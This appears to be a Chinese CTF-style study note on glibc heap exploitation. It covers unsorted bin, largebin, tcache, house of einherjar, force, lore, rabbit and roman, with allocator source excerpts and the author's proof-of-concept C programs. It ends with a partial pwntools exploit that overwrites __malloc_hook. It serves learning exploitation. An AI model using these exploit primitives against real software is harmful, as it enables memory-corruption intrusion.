调用`malloc`时，反向遍历`unsorted bin`，若`unsorted bin`里面恰好有与请求的`chunk size`相等的`chunk`大小，那么将对应的`chunk`取出来，该`chunk`也就被叫做`victim`。若不是恰好相等，那么这个`chunk`就会被放到对应的`small bin`或者`large bin`中去。

来看这一小段`glibc2.23`的源代码：（第一行和第二行之间省略了一部分不影响的）

```c
bck = victim->bk;                        
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```

正常情况下，这一小段代码会将`victim`取出，而`unsorted bin`继续保持双向链表。注意，`victim`始终是`unsorted bin`里面的最后一个`chunk`，因为是反向遍历的`unsorted bin`，且遍历到的`chunk`要么会返回给用户，要么就会被移动到`small bin`或者`large bin`里面去。

而攻击情况下，我们将控制`victim`的`bk`指针为希望进行地址修改的地方减去`8byte`的地方（32位为`4byte`）。

我们通过画图的方式来解释一下正常情况和攻击的情况。

首先是正常情况：

![image-20230623150536713](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230623150536713.png)如图所示，我们假设最后一个`chunk`刚好是`malloc`需要的大小，因此被标记为`victim`。

此时运行到第一行代码 `bck = victim->bk;`很简单，我们将`victim`的`bk`指针指向的`chunk`标记为`bck`。如图所示：

![image-20230623150554561](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230623150554561.png)

然后是第二行代码`unsorted_chunks (av)->bk = bck;` 很简单，本来`unsorted bin`的`bk`指针是指向`victim`的，而`victim`将要被`malloc`，因此先将`unsorted bin`的`bk`指针指向`bck`。

第三行代码`bck->fd = unsorted_chunks (av);`也很简单，和上面同理，我们要将`bck`的`fd`指针指向`unsorted bin`，以此将`victim`脱链。这两步如图所示：

![image-20230623151132502](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230623151132502.png)

此时实际上`victim`的两个指针还指向它们，但`unsorted bin`和`bck`指针都不再指向它，因此相当于`victim`已经被取出了。

**现在我们考虑对其进行攻击的情况。**

若我们能够控制`victim`的`bk`指针，并将其指向一个`fake_chunk`（该`fake_chunk`的`fd`指针是我们希望修改的值。也就是`&fake_chunk + 0x10`，那么在代码的第一行`bck = victim->bk;   `，将会出现如图所示的情况：

![image-20230623151718915](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230623151718915.png)

那么第二行代码`unsorted_chunks (av)->bk = bck;`，将会将`unsorted bin`的`bk`指针也指向该`fake_chunk`。

第三行代码`bck->fd = unsorted_chunks (av);`则是攻击的真正实施：它将`bck`处的`fd`指针修改为了`unsorted bin`的地址。也就是实现了这一步：`*(&fake_chunk + 0x10) = unsorted_bin`。

此时如图所示：

![image-20230623152236540](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230623152236540.png)

至此，已经实现了攻击。

# largebin attack

## largebin结构示意图

网上的教程害人不浅，例如笔者曾经阅读过一些文章后得出下面的示意图，实际上是错误的。

![image-20230703232238755](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230703232238755.png)

正确的结构图如图所示：

- 每一个`largebin`中存放的`chunk`大小是不相同的，一共有`63`个`largebin`。在这`63`个`largebin`中，前`32`个`largebin`的最大`chunk`和最小的`chunk`之差为`64bytes(0x40)`。例如第一个`largebin`的大小为`512bytes-568bytes`，而第二个`largebin`的大小就为`576bytes-632bytes`。
- 每一个`largebin`中的`chunk`按照大小顺序从大到小排序。
- 若大小相同，则会按照释放顺序排序：最先释放的`chunk`拥有`fd_nextsize`和`bk_nextsize`指针，之后的`chunk`的这两个指针的值都为`0`。若将这个`chunk`称为小堆头，那么后面释放的`chunk`都会被插入到小堆头的后面。因此，对于同一个大小的`large chunk`，最先释放的在最上面，除此之外越先释放在越后面。

- `fd_nextsize`和`bk_nextsize`是指向当前`bin`的下一个大小的`chunk`。`fd_nextsize`指向比自己小的，而`bk_nextsize`指向比自己大的。

![image-20230731190106590](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202307311901815.png)

## largebin attack（glibc 2.23）

首先让我们明确攻击需要的条件、出现的位置，和其正常情况下本来的目的。

首先是**攻击需要的条件：**

- 能够对一个`large bin`中的`chunk1`进行任意写
- 从`unsorted bin`中有一个正常`chunk2`释放到`large bin`

攻击能完成的结果：

- 将一个攻击者指定的地址的值修改为一个非常大的值，即一个`heap`的地址。

正常情况下，若用户使用`malloc`申请了一个`large chunk`，那么`ptmalloc2`会进行如下操作：

- 若直接与`unsorted bin`相连的是`last remainder`，那么切割该`last remainder`
- 否则，倒序遍历`unsorted bin`，遍历到的`chunk`称为`victim`。若用户请求的大小与`victim`的大小恰好相同，那么会将其返回给用户。若不是恰好相同，则会将`victim`插入到其属于的`large bin`或者`small bin`中。
- 在插入对应的`large bin`时，由于`large bin`是从大到小排序的，那么需要通过`bk_nextsize`指针一直定位到其属于的地方。**`Largebin attack`即发生在这里。**
- 遍历完`unsorted bin`后，若没有找到恰好相等的`chunk`，那么会去对应的`large bin`查看。 

**攻击的情况如下：**

假如本来有两个`chunk`，分别叫做`chunk1`和`chunk2`，且`chunk1`在`large bin`中，而`chunk2`在`unsorted bin`中，如图所示：

![image-20230802155357129](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230802155357129.png)

我们对`chunk1`进行构造，主要是针对其`size`、`bk`、`bk_nextsize`。如图所示：

我们最终的目的就是要修改其中的`value1`和`value2`。我们构造了两个`fake chunk`，其中一个是`chunk1`的`bk`指针指向的，它的`fd`指针就是我们要修改的`value1`，而另一个是`chunk1`的`bk_nextsize`指针指向的，它的`fd_nextsize`指针就是我们要修改的`value2`。因此，`chunk1`的`bk`和`bk_nextsize`指针是要分别指向要修改的地址处减去`0x10`和`0x20`个字节。此外，我们还将其`size`减小到了`0x3f0`。

![image-20230802165220878](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230802165220878.png)

接下来，若用户再次申请一个不属于`fast bin`的`chunk`，且`chunk2`与其不相同，那么会导致`chunk2`被挂进`large bin`。根据`chunk2`是不是比其属于的`bin`中最小的`chunk`还要小，会有两种插入逻辑，我们这里讲一下更复杂的情况，即`chunk2`不是最小的`chunk`。那么，此时我们便需要将其插入到正确的位置。这里放代码如下：

```c
while ((unsigned long)size < fwd->size) 
{
    fwd = fwd->fd_nextsize; 
    assert((fwd->size & NON_MAIN_ARENA) == 0);
}
if ((unsigned long)size == (unsigned long)fwd->size)
    fwd = fwd->fd; 
else               
{
    victim->fd_nextsize = fwd;                 
    victim->bk_nextsize = fwd->bk_nextsize;    
    fwd->bk_nextsize = victim;                 
    victim->bk_nextsize->fd_nextsize = victim; 
}
bck = fwd->bk;
```

由于我们将`chunk1`的`size`减小了，那么其中的`if`语句将不再执行，而是进入接下来的`else`。

其中，`fwd`也就是`chunk1`，`victim`是`chunk2`。

第一句`victim->fd_nextsize=fwd`，就是`chunk2`的`fd_nextsize`指向`fwd`，没有影响，甚至不用管

第二句，`victim->bk_nextsize=fwd->bk_nextsize`，这就有意思了，由于`fwd->bk_nextsize`是执行我们的`fake_chunk`，那么`victim->bk_nextsize`也会指向`fake_chunk`。此时如图所示：

![image-20230802170041495](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230802170041495.png)

第三句，`fwd->bk_nextsize=victim`，现在把`chunk1`的`bk_nextsize`指向`victim`，不用管。

第四句，`victim->bk_nextsize->fd_nextsize=victim`，此时`victim->bk_nextsize`是我们的`fake_chunk`，那么`victim->bk_nextsize->fd_nextsize`也就是`value1`！那么，我们就完成了`value2`的修改了，将其修改为了`victim`的地址。如图所示：

![image-20230802170334141](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230802170334141.png)

接下来在将`chunk2`置入`largebin`的过程中还会设置其`fd`指针和`bk`指针，代码如下：

```c
victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;
```

同样的，这会将`value1`修改为`victim`，此处不再赘述。

# tcache attack

先略记录一下，以后可能会回来补充细节。

## 什么事tcache

这是`glibc 2.26`以后引入的一种为了加快内存分配速度的机制，但同时也产生了很多安全漏洞。由于`ubuntu18.04`已经开始使用`glibc 2.27`，因此`ubuntu 18.04`版本存在`tcache`机制的使用。由于`tcache`机制也逐渐进行了诸多更新，修复了部分漏洞，本文暂时站在`tcache`最初始的版本进行讲解。

若存在`tcache`机制，那么当一个非`large chunk`被`free`后，它不再会被直接添加到`unsorted bin`或者`fast bin`，而是被添加到对应的`tcache bin`中。`tcache bin`是一个单向链表结构，只有`fd`指针，结构可以说是非常简单。

同一个大小的`tcache`中只能存在`7`个`chunk`（默认情况下）。因此，若你想将一个`chunk`申请到`unsorted bin`中，不妨申请`8`个属于`unsorted bin`的`chunk`，由此也可以使用`unsorted bin leak`来泄露`libc`基地址。

值得注意的是，`tcache`指向的直接是用户地址，而不是之前`bin`指向的是`header`的地址。

对于`tcache`，`glibc`会在第一次申请堆块的时候创建一个`tcache_perthread_struct`的数据结构，同样存放在堆上。它的定义如下所示：

```C
/* 每个线程都有一个这个数据结构，所以他才叫"perthread"。保持一个较小的整体大小是比较重要的。  */
// TCACHE_MAX_BINS的大小默认为64
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
// 在glibc2.26-glibc2.29中，counts的大小为1个字节，因此tcache_perthread_struct的大小为1*64 + 8*64 = 0x250(with header)
// 在glibc2.30及以上版本中，counts的大小为2个字节，因此tcache_perthread_struct的大小为2*64 + 8*64 = 0x290(with header)
```

## tcache poisoning

若存在`tcache`机制时，若申请一个属于`tcache`中的`chunk`，使用到的函数是`tcache_get()`函数，该函数在初始版本没有任何的安全机制，因此只需要简单地将某个`tcache`中的`chunk`的`fd`指针修改为想要分配到的地方，即可在目标地址申请一个`chunk`。

## tcache double free

若没有`tcache`的时候，`double free`不能简单地连续对一个`chunk`进行`free`两次这个机制略显复杂的话，那么`tcache double free`就显得单纯许多了。在初始版本下`tcache`的释放操作是使用的`tcache_get()`函数，该函数同样没有任何安全机制，因此可以简单地直接对一个`chunk`进行两次`free`，因此可以申请回该`chunk`，对其修改后再次申请，完成任意地址写/任意地址`chunk`分配的目的。

要注意的是，`glibc`在后来的版本中，在`tcache`的数据结构中添加了`key`，会一定程度上防止`double free`的发生。这个后面再补。

## tcache house of spirit

与`fastbin`的`house of spirit`是相当类似的，不同的是，`tcache`的`house of spirit`更加简单，可以直接在任意地方伪造一个`chunk`然后进行`free`。`fast bin`的`house of spirit`还需要控制要`free`的下一个`chunk`的`size`域。

## tcache stashing unlink attack

这个可以完成任意地址的`chunk`申请。

首先要知道两个小知识点：

- `calloc`获取`chunk`不会从`tcache`中获取
- 在`tcache`有空闲位置的情况下，若从`small bin`中获取到了一个`chunk`，那么会将`small bin`中的所有`chunk`挂到`tcache`中

通过上面两个知识点即可完成`tcache stashing unlink attack`。讲一下流程：

- 通过一定方式，让`tcache`和`small bin`中同时存在某个大小的`chunk`，且`small bin`中不止一个
- 修改`small bin`中的末尾的`chunk`的`bk`指针，使其指向要申请的`fake chunk`。
- 使用`calloc`申请一个`chunk`，此时被修改过的`chunk`将会被挂入`tcache`。而由于该`chunk`的`bk`指针被修改，那么操作系统会误认为该`fake chunk`也在`small bin`中，此时也会被挂入`tcache`中。
- 由于`tcache`是`LIFO`，只要直接申请就可以获得该`fake chunk`。

## tcache_perthread_struct hijacking

上面我们提到了`tcache_perthread_struct`数据结构的形式为：

```c
/* 每个线程都有一个这个数据结构，所以他才叫"perthread"。  */
// TCACHE_MAX_BINS的大小默认为64
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
// 在glibc2.26-glibc2.29中，counts的大小为1个字节，因此tcache_perthread_struct的大小为1*64 + 8*64 = 0x250(with header)
// 在glibc2.30及以上版本中，counts的大小为2个字节，因此tcache_perthread_struct的大小为2*64 + 8*64 = 0x290(with header)
```

在程序初始化堆的时候，会创建一个对应大小的`tcache_perthread_struct`。其中：

- `counts`数组存放了每一个大小的`chunk`目前存放了多少个。
- `entries`是一个链表，它里面存放的值是在下一次申请这个大小的`tcache chunk`的时候，应该分配哪个位置的`chunk`。

要注意，`counts`和`entries`的对应关系是按顺序来的，例如前`0x40`个字节中，第`0`个字节指示大小为`0x20`的`tcache chunk`的已分配数量，第`1`个字节指示大小为`0x30`的`tcache chunk`的已分配数量。又例如，`0x40`字节处的`8`字节表示下一个要分配的`0x20`大小的`tcache chunk`要分配的地址。

若我们能够控制`tcache_pertrhead_struct`，则这两个值都可以被篡改。效果分别为：

- 若我们控制了`counts`，对指定地方大小的`count`设置为7，则再次分配该大小的`chunk`时，就不会分配到`tcache`中。例如可以分配一个`unsorted chunk`来泄露`libc`。
- 若我们控制了`entries`，相当于实现了任意大小的`chunk`的`tcache poisoning`，即可以在任意地址分配`chunk`，威力巨大。

# house of enherjar

一句话描述该漏洞：在任意地方伪造一个`fake_chunk`，然后通过控制紧邻`top chunk`的`chunk`的`prev_size`和`prev_inuse`位，导致当该`chunk`被释放时会根据`prev_size`直接合并到`fake_chunk`，而由于该`chunk`本身和`top chunk`相连，那么该`fake chunk`又会与`top chunk`合并，导致`top chunk`的指针从`fake chunk`开始，这样一来从`top chunk`申请内存时将申请到`fake chunk`处的内存。如图所示（该图来自于[hollk大佬的博客](https://blog.csdn.net/qq_41202237/article/details/117112930?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169149897016800180659893%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=169149897016800180659893&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-117112930-null-null.268^v1^koosearch&utm_term=house%20of%20force&spm=1018.2226.3001.4450)）：

![image-20230809233712730](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20230809233712730.png)

该技术用了两个地方的漏洞：

- 若紧挨着`top chunk`的`chunk`被`free`，那么该`chunk`会与`top chunk`合并。
- 当前`chunk`被`free`时，会通过当前`chunk`的`prev_inuse`位来判断前一个`chunk`是否也是`free`状态，若是，那么会进行合并。（像`fastbin`这种不会合并的不包括在内）
- 合并过程是先后向合并（与前面的`chunk`合并），再前向合并（与后面的`chunk`合并，比如`top chunk`）

你需要控制才能完成攻击的：

- 控制紧邻`top chunk`的`chunk`的`prev_inuse`位，以及该`chunk`的`prev_size`。（通常是使用`off by one`）
- 在某处（通常是位于栈上）能够伪造一个`fake chunk`。

笔者本人写了一段`house of enherjar`的代码，如下所示：

```c
/*

        else
        // 假如它的下一个chunk是top chunk，那么和top chunk进行合并
        {
            size += nextsize; // 加上top chunk的大小
            set_head(p, size | PREV_INUSE); // 设置标志位
            av->top = p; // 合并之后的chunk成为新的top chunk
            check_chunk(av, p); // 检查是否合法
        }

*/

#include <stdio.h>
#include <stdlib.h>
int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    long *fake_chunk[0x110]; // 最终我们希望使得这里成为top chunk并申请。
    printf("the addr of fake_chunk is %p.\n", &fake_chunk[0]);

    long *a = malloc(0x100); // 申请一个0x110的small chunk，如此以来它会紧邻top chunk
    long *real_a = a - 2;    // real_a是a的起始地址
    printf("the addr of real_a is %p.\n", real_a);
    printf("so the diff from real_a to fake_chunk is %p.\n", (long)real_a - (long)&fake_chunk[0]);

    // 攻击开始
    real_a[0] = (long)real_a - (long)&fake_chunk[0];         // 修改a的prev_size大小
    real_a[1] = 0x110;                                       // 修改a的prev_inuse为0
    fake_chunk[1] = (long)real_a - (long)&fake_chunk[0] + 1; // 修改fake_chunk的size
    // 在释放的时候，后向合并时会将fake_chunk进行unlink
    // 需要修改fake_chunk的fd bk fd_nextsize bk_nextsize指针来绕过unlink检查
    // unlink有安全检查：P->fd->bk == P, P->bk->fd == P，同时fd_nextsize也是如此
    // 将fake_chunk的指针统统指向本身，绕过一切
    fake_chunk[2] = &fake_chunk[0];
    fake_chunk[3] = &fake_chunk[0];
    fake_chunk[4] = &fake_chunk[0];
    fake_chunk[5] = &fake_chunk[0];

    free(a);                 // 释放chunk a，如此一来先合并fake_chunk，再与top chunk合并
    long *b = malloc(0x100); // 再申请一个chunk
    printf("the addr of new malloc is %p.\n", b - 2);


    // 下面是在堆上伪造的。

    // long *a = malloc(0xf0); // 申请一个大小为0x100的chunk，并且最终我们希望它成为top chunk
    // printf("the addr of chunk a is %p.\n", a - 2);

    // // 接下来，我们申请3个大小为0x100的chunk
    // malloc(0xf0);
    // malloc(0xf0);
    // malloc(0xf0);

    // // 我们再申请最后一个大小为0x100的chunk，那么这个chunk b将会紧邻top chunk
    // long *b = malloc(0xf0);

    // // 攻击
    // b[-2] += 0x400; // 将chunk b的prev_size增大0x400
    // b[-1] = 0x100;  // 修改chunk b 的prev_inuse为0
    // a[-1] = 0x401;  // 修改chunk a的size为0x400
    // a[0] = a - 2;
    // a[1] = a - 2;
    // a[2] = a - 2;
    // a[3] = a - 2;

    // free(b); // 释放 chunk b，这样一来chunk a成为top chunk
    // long *c = malloc(0x100);
    // printf("the addr of chunk c is %p.\n", c - 2);
    return 0;
}
```

# house of force

一句话描述该漏洞，在`glibc 2.23`下，通过控制`top chunk`的`size`域为一个特别大的值，导致可以通过`malloc`特别大的值或者负数来将`top chunk`的指针指向任意位置。

你需要进行控制的：

- `top chunk`的`size`域
- 你需要可以`malloc`一个特别大的值
- 你需要可以多次`malloc`

**原理：**

在`glibc 2.23`中，对于`top chunk`的检查仅仅只有`(unsigned long) (size) >= (unsigned long) (nb + MINSIZE)`。

那么，若我们将`top chunk`的`size`修改为一个特别大的值，甚至是`-1`（由于是无符号数在进行判断，那么`-1`是最大的数），那么便可以申请任意大小的`chunk`。源码如下：

```c
// 获取当前的top chunk，并计算其对应的大小
victim = av->top;
size   = chunksize(victim);
// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av->top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
```

这里用`wiki`的例子，由于堆是低地址到高地址增长，那么可以申请负数地址来申请到更低的地址（例如`malloc@got.plt`）：

```c
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;        // <=== 这里把top chunk的size域改为0xffffffffffffffff
    malloc(-4120);  // <=== 减小top chunk指针
    malloc(0x10);   // <=== 分配块实现任意地址写
}
```

也可以通过申请特别大的值来申请到高地址，例如`__malloc_hook`（在`libc`里面）

```c
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;                 <=== 修改top chunk size
    malloc(140737345551056); <=== 增大top chunk指针
    malloc(0x10);
}
```

笔者通过一小段代码在`glibc2.23`中实现了`house of force`：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    long fake_chunk[0x110]; // 最终要是申请到了这里，那就说明攻击成功
    printf("the addr of fake_chunk is %p.\n", fake_chunk);

    long *a = malloc(0x100);                     // 如此一来，chunk a的下一个chunk将会是top chunk
    long *top_chunk = (long *)((long)a + 0x100); // top_chunk在a偏移0x100的地方
    top_chunk[1] = -1; // 将top chunk的大小修改为无限大

    long diff = (long)&fake_chunk[0] - (long)top_chunk; // 计算fake_chunk和top chunk此时相差的距离
    malloc(diff - 0x10);                                // malloc这个距离大小-0x10的chunk就是申请一个大小等于这个距离的，使得top chunk减小这个距离

    long *b = malloc(0x100);                                // 随便申请一个chunk
    printf("the addr of new malloc chunk is %p.\n", b - 2); // 发现申请到的chunk的地址就是fake

    return 0;
}
```

# house of lore

`house of lore`是针对`small bin`的一种攻击方法，和`unsorted bin attack`与`large bin  attack`很类似。个人感觉称之为`small bin attack`也没啥问题。

一句话描述该攻击方式：正常情况下，`small bin`取出一个`chunk`的时候会从末尾取出，这个`victim`的`bk`指针指向的是倒数第二个`chunk`，称为`bck`。此时检查`bck`的`fd`指针是否指向`victim`，通过检查后将`victim`取出，并将`bck`的`fd`指针指向`small bin`。若我们控制`victim`的`bk`指针，使其指向一个我们控制的`fake_chunk`，那么只需要控制该`fake_chunk`的`fd`指针指向了`victim`，这样以来便可以在取出`victim`的时候，将`fake_chunk`挂入`small bin`中。注意，取出`fake_chunk`的时候又需要经过`small bin`的检查，因此再此构造一个`fake_chunk2`，将`fake_chunk2`的`fd`指针指向`fake_chunk`，`fake_chunk`的`bk`指向`fake_chunk2`即可。

`small bin`取出的过程如下：

```c
if (in_smallbin_range(nb)) // 请求的大小位于smallbin
    {
        idx = smallbin_index(nb); // 请求的大小属于哪一个smallbin，找到下标idx
        bin = bin_at(av, idx);    // 通过下标找到具体的这个bin

        if ((victim = last(bin)) != bin) // last宏就是#define last(b) (b->bk)，因此就是定位到smallbin的最后一个chunk，而且smallbin不为空（bin->bk!=bin）
        {
            if (victim == 0) /* initialization check */
                             // 假如smallbin为空，那么这里不会进行分配，要到后面unsortedbin。合并所有的fastbin chunk，合并到unsorted bin里面去
                malloc_consolidate(av);
            else // 定位到了这个smallbin，取出里面的一个chunk，从队尾开始取
            {
                bck = victim->bk;                        // bck是victim的bk，也就是倒数第二个
                if (__glibc_unlikely(bck->fd != victim)) // bck的fd假如不为victim说明出错
                {
                    errstr = "malloc(): smallbin double linked list corrupted";
                    goto errout;
                }
                set_inuse_bit_at_offset(victim, nb); // 取出这个victim。也就是队尾的这一个。
                bin->bk = bck;                       // 取出后，bin的bk将会变成倒数第二个chunk
                bck->fd = bin;                       // 取出后，倒数第二个chunk将会指向small bin

                if (av != &main_arena) // 假如不是在主线程(main_arena)，添加上不是在main_arena的标记
                    victim->size |= NON_MAIN_ARENA;
                check_malloced_chunk(av, victim, nb);
                void *p = chunk2mem(victim); // 获得指向可用区域的指针
                alloc_perturb(p, bytes);
                return p; // 返回该指针
            }
        }
    }
```

笔者在`glibc 2.23`下，使用了以下代码成功完成攻击：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    long fake_chunk[0x110]; // 在栈上伪造一个fake chunk，最终申请到这里表示攻击成功
    long fake_chunk2[0x110]; // 需要fake_chunk2，作用是最后从small bin中取出fake_chunk的时候，逃避检查
    printf("the addr of fake chunk is %p\n", fake_chunk);
    long* a = malloc(0x100); // 申请一个属于small bin的chunk
    malloc(0x20); // 防止被top chunk合并
    free(a); // chunk a会被置入 unsorted bin
    malloc(0x120); // 申请一个大chunk，这会让chunk a置入small bin 

    /* 攻击 */
    a[1] = &fake_chunk[0]; // chunk a的bk指针要指向fake_chunk
    fake_chunk[2] = a - 2; // fake_chunk的fd指针要指向chunk a 
    malloc(0x100); // 申请一个chunk a大小的chunk

    // 接下来我们希望能够取出fake_chunk，但是这个时候又会经历一次small bin的检查
    // 因此我们借助fake_chunk2来逃避检查
    // 只需要将fake_chunk的bk指向fake_chunk2，fake_chunk2的fd指向fake_chunk即可。
    fake_chunk[3] = &fake_chunk2[0]; // fake_chunk的bk指向fake_chunk2, fake_chunk2就是bck
    fake_chunk2[2] = &fake_chunk[0]; // fake_chunk2的fd必须指向fake_chunk
    long* b = malloc(0x100); // 再次申请一个
    printf("the addr of chunk b is %p.\n", b - 2); // 神奇地发现就是栈上的地址
    return 0;
}
```

## house of rabbit

`house of rabbit`是一种`fastbin`的攻击方法，可以在没有`leak`的情况下通过获得一个`overlap chunk`或者是一个`fake chunk`。这是利用了`malloc_consolidate`没有进行很好的安全校验来进行攻击的。

我们知道`fastbin attack`需要保证取出的`chunksize`和`fastbin`的`size`一样，在很多情况下需要寻找`0x7f`或者是打`unsortedbin attack`来找`0x7f`。而`house of rabbit`同样针对`fastbin`，它只需要能够触发`malloc_consolidate`（`malloc`一个很大的值就可以触发），然后下列两者条件中的一个即可：

- 可以控制`fastbin`中`chunk`的`fd`指针
- 可以控制`fastbin`中`chunk`的`size`

上面我们提到两个条件是二选一即可，是因为两个条件可以发起不同的攻击。下面让我们详细理解。

## 可以控制fd指针

当可以控制`fd`指针的时候，师傅们很容易想到`fastbin attack`，然而`fastbin attack`在部分情况下存在局限性。

只要可以控制`fastbin chunk`的`fd`指针，之后只需要将`fd`指针指向一个任意地方的`fake chunk`，然后触发`malloc_consolidate`，就可以申请到该位置的`fake chunk`。但也需要附加条件，那就是需要该`fake chunk`的下一个和下下个`fake chunk`也构造好（实际上只需要构造`chunk size`）。画个图来理解：

![image-20231114100530815](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311141005871.png)

## 可以控制chunksize

当可以控制`chunksize`时，可以获得一个`chunk overlap`。具体过程如下：

首先申请两个相同大小的`chunk`，例如`0x40`的两个`chunk`。释放后，我们将第一个`chunksize`更改为`0x80`，此时若触发`malloc_consolidate`，那么会分别将两个`chunk`添加到大小为`0x40`和`0x80`的`smallbin`中。那么当`size`被修改为`0x80`的`chunk`被添加到大小为`0x80`的`smallbin`中后，`chunk overlap`实际上就已经发生了。因为只需要申请大小为`0x80`的`chunk`就可以获得这个`chunk`了。

# house of roman

这种攻击方式可以在完全没有`leak`的情况下，多次利用与`unsortedbin`相连的`chunk`的`fd`和`bk`指向`main_arena+88`，或者`unsortedbin attack`来得到`main_arena+88`，然后根据这个`main_arena+88`来覆盖低位，通过一种`partial overwrite`的方式来进行攻击。个人认为`house of roman`并不是像其他`house of xxx`系列一样有明确的攻击利用链，师傅们只需要能够理解利用其中多次利用`unsortedbin`的`main_arena+88`的`partial write`即可。此外，还需要师傅们理解如何通过`fastbin attack`获取`unsortedbin`的`main_arena+88`：利用单字节溢出修改`unsortedbin chunk`的`size`，然后打`fastbin attack`。

但是这种攻击方式在`ASLR`开启时需要用到爆破，概率比较低为`1/4096`，因此师傅们理解这种攻击方式的思想即可。

作者提供了`github`[链接](https://github.com/romanking98/House-Of-Roman)，其中`new_chall`题目的详细注释的`exp`如下：

```python
from pwn import *
from LibcSearcher import *

filename = './new_chall'
context(log_level='debug')
local = 1
elf = ELF(filename)
# libc = ELF('')

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', )

def debug():
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid)
    pause()

choice_words = '3. Free\n'

menu_add = 1
add_index_words = 'index :'
add_size_words = 'size of chunk :'
add_content_words = ''

menu_del = 3
del_index_words = 'Enter index :'

menu_edit = 2
edit_index_words = 'index of chunk :'
edit_size_words = ''
edit_content_words = 'data :'

def add(index=-1, size=-1, content=''):
    sh.sendlineafter(choice_words, str(menu_add))
    if add_size_words:
        sh.sendlineafter(add_size_words, str(size))
    if add_index_words:
        sh.sendlineafter(add_index_words, str(index))
    if add_content_words:
        sh.sendafter(add_content_words, content)

def delete(index=-1):
    sh.sendlineafter(choice_words, str(menu_del))
    if del_index_words:
        sh.sendlineafter(del_index_words, str(index))

def edit(index=-1, size=-1, content=''):
    sh.sendlineafter(choice_words, str(menu_edit))
    if edit_index_words:
        sh.sendlineafter(edit_index_words, str(index))
    if edit_size_words:
        sh.sendlineafter(edit_size_words, str(size))
    if edit_content_words:
        sh.sendafter(edit_content_words, content)

def leak_info(name, addr):
    success('{} => {}'.format(name, hex(addr)))

# 我需要在malloc_hook中写one_gadget
# 思路是通过fastbin attack来申请到one_gadget
sh.recv()
sh.sendline('good name')
add(index=0, size=0x18) # size 0x20
add(index=1, size=0xc8) # size 0xd0
add(index=2, size=0x60) # size 0x70

payload = b'a'*0x68 + p64(0x61)
edit(index=1, content=payload)

# free再申请回来，由此在chunk内写下main_arena+88
delete(index=1)
add(index=1, size=0xc8)

# 存在单字节溢出，通过chunk0来修改chunk1的size
edit(index=0, content=b'a'*0x18 + p8(0x71))

# 申请几个大小为0x70的chunk，目的是通过fastbin的fd指针中的堆地址来获得含有main_arena+88地址的那个fake fastbin chunk
add(index=3, size=0x60) # size 0x70
add(index=4, size=0x60) # size 0x70
delete(index=2)
delete(index=3) # fastbin: 3->2
# fastbin: chunk3 -> chunk2
# 其中chunk3的fd指针在我本次调试为0x5555556050f0，且含有main_arena+88地址的那个fake chunk的地址为0x555555605020
# 因此只修改最后一位为0x20，使其fastbin指向最后一位
edit(index=3, content=p8(0x20))

# 修改后，fastbin为chunk3 -> fake_chunk -> main_arena + 88
# 我们知道main_arena + 88和malloc_hook是很接近的，实际上是main_arena比__malloc_hook只要大0x68
# 我们又可以通过修改fake_chunk的最后两字节来获得一个包含__malloc_hook的chunk
# 在__malloc_hook之前的0x23字节处有一个0x7f，因此可以通过这个来构造
# 那么有一个明显的问题：ASLR开启时，最低位只有3位是固定的。而我们需要覆盖4位，因此这里相当于会进行一个爆破，成功概率为1/16
# 在我调试的时候，main_arena+88为0x7ffff7dd1b78，而0x7f的包含malloc_hook的fake_chunk为0x7ffff7dd1aed，因此我会覆盖最低两字节为0x1aed
edit(index=1, content=p16(0x1aed))
add(index=5, size=0x60)
add(index=6, size=0x60)
add(index=7, size=0x60) # 这里将会申请到malloc_hook，但是其值为0

# 那么接下来，我们打unsortedbin attack，往malloc_hook里面写main_arena+88
add(index=8, size=0x100)
add(index=9, size=0x100) # 防止合并
delete(index=8) # 此时bk应该是main_arena+88，而在我调试的时候malloc_hook地址为0x7ffff7dd1b10，那么覆盖最低位为0x00（malloc_hook-0x10）即可
edit(index=8, content=p64(0) + p8(0x0))
add(index=10, size=0x100) # 发起unsortedbin attack，会往malloc_hook里面写main_arena+88

